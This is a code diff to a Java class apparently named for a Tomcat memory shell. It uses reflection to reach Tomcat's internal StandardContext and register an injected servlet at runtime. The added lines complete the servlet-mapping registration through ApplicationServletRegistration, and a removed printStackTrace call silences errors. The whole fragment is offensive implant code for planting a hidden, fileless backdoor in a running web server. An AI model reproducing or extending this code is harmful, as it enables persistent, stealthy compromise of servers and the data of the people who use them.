@@ -65,7 +65,7 @@ public class TomcatServletThreadMS implements Servlet {
              */
             Object standardContext;
             try {
-                ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
+                Object servletContext = request.getClass().getDeclaredMethod("getServletContext").invoke(request);
                 Object applicationContext = getFieldValue(servletContext, "context");
                 standardContext = getFieldValue(applicationContext, "context");
             } catch (NoSuchMethodException e) {
@@ -73,9 +73,9 @@ public class TomcatServletThreadMS implements Servlet {
             }
 
             // wrapper 封装
-            Object wrapperFlag = standardContext.getClass().getSuperclass().getDeclaredMethod("findChild", String.class).invoke(standardContext, NAME);
+            Object container = standardContext.getClass().getSuperclass().getDeclaredMethod("findChild", String.class).invoke(standardContext, NAME);
 
-            if (wrapperFlag == null) {
+            if (container == null) {
 //                org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
                 Object wrapper = standardContext.getClass().getDeclaredMethod("createWrapper").invoke(standardContext);
 //                wrapper.setName(NAME);
@@ -101,11 +101,11 @@ public class TomcatServletThreadMS implements Servlet {
 //                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
 //                        registration.addMapping(pattern);
 //                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
-
+                    Object applicationServletRegistration = Class.forName("org.apache.catalina.core.ApplicationServletRegistration").getConstructor(Class.forName("org.apache.catalina.Wrapper"), Class.forName("org.apache.catalina.Context")).newInstance(wrapper, standardContext);
+                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(applicationServletRegistration, (Object) new String[]{pattern});
                 }
             }
         } catch (Exception e) {
-            e.printStackTrace();
         }
     }
 
